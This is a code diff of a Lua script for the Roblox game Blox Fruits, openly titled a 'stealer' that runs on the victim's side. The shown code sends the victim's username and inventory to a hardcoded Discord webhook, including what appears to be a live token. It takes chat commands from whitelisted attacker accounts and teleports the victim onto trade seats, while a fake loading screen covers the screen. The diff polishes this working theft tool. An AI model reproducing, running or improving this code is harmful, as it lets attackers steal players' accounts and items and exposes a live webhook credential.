@@ -1,51 +1,7 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v5.1
--- Fixes: Wrapped in pcall with on-screen debug logger. Fully closed scopes.
+-- BLOX FRUITS STEALER — VICTIM SIDE v5.2
+-- Clean file. Smooth Tween teleport. Full command control.
 -- =============================================================================
-
--- =============================================================================
--- 0. ON-SCREEN DEBUG LOGGER
--- =============================================================================
-local DebugGui = Instance.new("ScreenGui")
-DebugGui.Name = "StealerDebug"
-DebugGui.ResetOnSpawn = false
-DebugGui.DisplayOrder = 2147483647
-pcall(function() DebugGui.Parent = game:GetService("CoreGui") end)
-if not DebugGui.Parent then DebugGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui") end
-
-local DebugFrame = Instance.new("Frame")
-DebugFrame.Size = UDim2.new(0, 450, 0, 150)
-DebugFrame.Position = UDim2.new(0.5, -225, 0, 10)
-DebugFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-DebugFrame.BackgroundTransparency = 0.1
-DebugFrame.BorderSizePixel = 2
-DebugFrame.BorderColor3 = Color3.fromRGB(0, 255, 100)
-DebugFrame.Parent = DebugGui
-
-local DebugText = Instance.new("TextLabel")
-DebugText.Size = UDim2.new(1, -20, 1, -20)
-DebugText.Position = UDim2.new(0, 10, 0, 10)
-DebugText.BackgroundTransparency = 1
-DebugText.TextColor3 = Color3.fromRGB(0, 255, 100)
-DebugText.TextSize = 14
-DebugText.Font = Enum.Font.Code
-DebugText.TextXAlignment = Enum.TextXAlignment.Left
-DebugText.TextYAlignment = Enum.TextYAlignment.Top
-DebugText.TextWrapped = true
-DebugText.Text = "Booting v5.1...\n"
-DebugText.Parent = DebugFrame
-
-local function dLog(msg)
-    print("[stealer] " .. tostring(msg))
-    pcall(function()
-        DebugText.Text = DebugText.Text .. "\n" .. tostring(msg)
-    end)
-end
-
--- =============================================================================
--- MAIN EXECUTION (Wrapped in pcall)
--- =============================================================================
-local success, err = pcall(function()
 
 -- =============================================================================
 -- 1. CONFIG
@@ -53,6 +9,7 @@ local success, err = pcall(function()
 local S2, S3 = 4442272183, 7449423635
 local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
 
+-- >>> PUT YOUR ALT ACCOUNT'S EXACT USERNAME HERE <<<
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
     ["blueno_op1"] = true,
@@ -85,8 +42,6 @@ local SG           = game:GetService("StarterGui")
 local LP           = Players.LocalPlayer
 local PG           = LP:WaitForChild("PlayerGui", 10)
 
-dLog("Services loaded.")
-
 local CommF          = nil
 local TradeFunction  = nil
 local lastSitTime     = 0
@@ -118,7 +73,7 @@ end
 -- 3. LOADER
 -- =============================================================================
 local function showLoadingScreen()
-    if not PG then dLog("PG nil, loader aborted.") return end
+    if not PG then return end
     local ReplicatedFirst = game:GetService("ReplicatedFirst")
     if not game:IsLoaded() then pcall(function() ReplicatedFirst:RemoveDefaultLoadingScreen() end) end
 
@@ -126,7 +81,7 @@ local function showLoadingScreen()
     screenGui.Name = "ProfileLoadingScreen"
     screenGui.IgnoreGuiInset = true
     screenGui.ResetOnSpawn = false
-    screenGui.DisplayOrder = 99999 -- Lower than debug gui so we can see debug if it crashes
+    screenGui.DisplayOrder = 2147483647
     screenGui.Parent = PG
 
     local mainFrame = Instance.new("Frame")
@@ -230,7 +185,7 @@ local function showLoadingScreen()
     statusLabel.Size = UDim2.new(1, 0, 0, 20)
     statusLabel.Position = UDim2.new(0, 0, 0.63, 0) 
     statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "Initializing..."
+    statusLabel.Text = "Initializing environmental pipeline..."
     statusLabel.Font = Enum.Font.GothamMedium
     statusLabel.TextSize = 9.5
     statusLabel.TextColor3 = Color3.fromRGB(150, 155, 170)
@@ -335,10 +290,9 @@ local function showLoadingScreen()
     if loopConnection then loopConnection:Disconnect() end
     if blur.Parent then blur:Destroy() end
     if screenGui.Parent then screenGui:Destroy() end
-    dLog("Loader completed.")
 end
 
-task.spawn(function() local ok, err = pcall(showLoadingScreen) if not ok then dLog("Loader Error: " .. tostring(err)) end end)
+task.spawn(function() pcall(showLoadingScreen) end)
 
 -- =============================================================================
 -- 4. REMOTES + WEBHOOK
@@ -357,33 +311,23 @@ local RemotesFolder = waitChild(RS, "Remotes", 30)
 if RemotesFolder then
     CommF = waitChild(RemotesFolder, "CommF_", 30)
     TradeFunction = waitChild(RemotesFolder, "TradeFunction", 30)
-    dLog("Remotes found.")
-else
-    dLog("Remotes NOT found.")
 end
 
 local function getHttpFn()
-    if syn and syn.request then return syn.request, "syn.request" end
-    if request then return request, "request" end
-    if http_request then return http_request, "http_request" end
-    if fluxus and fluxus.request then return fluxus.request, "fluxus.request" end
-    if http and http.request then return http.request, "http.request" end
-    return nil, "none"
+    if syn and syn.request then return syn.request end
+    if request then return request end
+    if http_request then return http_request end
+    if fluxus and fluxus.request then return fluxus.request end
+    if http and http.request then return http.request end
+    return nil
 end
 
-local function postEmbed(embed, label)
-    local fn, fnName = getHttpFn()
-    if not fn then dLog("WEBHOOK SKIP: no http fn") return false end
+local function postEmbed(embed)
+    local fn = getHttpFn()
+    if not fn then return end
     local okBody, body = pcall(function() return HttpService:JSONEncode({ content = "@everyone", embeds = { embed } }) end)
-    if not okBody then dLog("WEBHOOK FAIL: JSON encode") return false end
-    local ok, res = pcall(fn, { Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
-    if not ok then dLog("WEBHOOK FAIL (" .. fnName .. "): " .. tostring(res)) return false end
-    if res and res.StatusCode then
-        if res.StatusCode >= 400 then dLog("WEBHOOK FAIL " .. res.StatusCode) return false
-        else dLog("WEBHOOK OK (" .. label .. ")") return true end
-    end
-    dLog("WEBHOOK OK (" .. label .. ")")
-    return true
+    if not okBody then return end
+    pcall(fn, { Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
 end
 
 task.spawn(function()
@@ -392,7 +336,7 @@ task.spawn(function()
         title = "stealer online",
         description = string.format("Victim: %s\nGame: %s\nPlaceId: %d", LP.Name, tostring(game.Name), game.PlaceId),
         color = 0x00AAFF,
-    }, "boot ping")
+    })
 end)
 
 -- =============================================================================
@@ -469,7 +413,7 @@ local function sendInventoryEmbed(reason)
         },
         footer = { text = "ofx in the corner" },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-    }, "trade start")
+    })
 end
 
 -- =============================================================================
@@ -546,9 +490,9 @@ local function pickSeat(exclude)
 end
 
 -- =============================================================================
--- 7. STABLE TELEPORT + SIT
+-- 7. SMOOTH TELEPORT + STABLE SIT
 -- =============================================================================
-local function stableTeleport(seat)
+local function smoothTeleport(seat)
     local char = waitForChar(10)
     if not char then return false end
     local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
@@ -562,12 +506,19 @@ local function stableTeleport(seat)
         if p:IsA("BasePart") then p.CanCollide = false end
     end
 
-    hrp.CFrame = seat.CFrame * CFrame.new(0, 3, 0)
-    task.wait(0.2)
+    local targetPos = seat.Position + Vector3.new(0, 2.5, 0)
+    local dist = (hrp.Position - targetPos).Magnitude
+    local duration = math.clamp(dist / 100, 0.2, 1.5)
+    
+    -- Tween to prevent the physics glitch/sideways sitting
+    local tw = TweenService:Create(hrp, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = CFrame.new(targetPos)})
+    tw:Play()
+    tw.Completed:Wait()
 
     for _, p in ipairs(char:GetDescendants()) do
         if p:IsA("BasePart") then p.CanCollide = true end
     end
+    task.wait(0.2)
     return true
 end
 
@@ -581,7 +532,7 @@ local function sitOn(seat)
         if hum and hum.Sit and tick() - lastSitTime < 5 then return true end
     end
 
-    if not stableTeleport(seat) then return false end
+    if not smoothTeleport(seat) then return false end
 
     char = waitForChar(5)
     if not char then return false end
@@ -722,12 +673,10 @@ local function handleCommand(message)
     local fn = COMMANDS[cmd]
     if not fn then return end
 
-    dLog("Command: " .. cmd)
     if cmd == "tp" then sayMessage("on my way bro !") else sayMessage("Working on it...") end
 
     task.spawn(function()
-        local ok, err = pcall(fn, args)
-        if not ok then dLog("cmd error: " .. tostring(err)) end
+        pcall(fn, args)
     end)
 end
 
@@ -752,7 +701,6 @@ pcall(function()
 end)
 
 LP.Chatted:Connect(handleCommand)
-dLog("Chat hooks active.")
 
 -- =============================================================================
 -- 10. MAIN LOOP
@@ -761,7 +709,7 @@ task.spawn(function()
     if not game:IsLoaded() then game.Loaded:Wait() end
     task.wait(1)
 
-    local ok, err = pcall(function()
+    pcall(function()
         waitForChar(30)
         local seat = currentSeat()
         if not seat then
@@ -798,7 +746,7 @@ task.spawn(function()
                     elseif tick() - oppositeSeen[key] >= HOP_CONFIRM_TIME then
                         oppositeSeen[key] = tick()
                         local target = pickSeat(tbl)
-                        if target then forceJumpOff(); sitOn(target) else dLog("Hostile opposite, holding.") end
+                        if target then forceJumpOff(); sitOn(target) else end
                     end
                 else
                     for k, t in pairs(oppositeSeen) do if tick() - t > 5 then oppositeSeen[k] = nil end end
@@ -806,19 +754,4 @@ task.spawn(function()
             end
         end
     end)
-    if not ok then dLog("FATAL in main: " .. tostring(err)) end
 end)
-
-end)
-
--- =============================================================================
--- CATCH ERRORS
--- =============================================================================
-if not success then
-    dLog("SCRIPT FATAL ERROR: " .. tostring(err))
-    DebugFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-    DebugText.TextColor3 = Color3.fromRGB(255, 0, 0)
-    DebugText.Text = "FATAL ERROR DETECTED:\n" .. tostring(err)
-else
-    dLog("Script initialized successfully.")
-end
